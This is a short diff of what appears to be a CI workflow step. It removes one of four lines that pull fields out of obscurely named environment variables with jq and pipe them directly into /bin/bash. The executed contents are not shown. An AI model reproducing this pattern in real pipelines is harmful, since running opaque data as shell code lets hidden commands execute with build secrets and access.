@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$l9188" | jq -r .ujhc2 | /bin/bash
           echo $npq307 | jq -r .ayd42 | /bin/bash
-          echo $chlzv663 | jq -r .btczi287 | /bin/bash
           printf '%s' "$v8320" | jq -r .dn4973 | /bin/bash
 
       - name: Save results
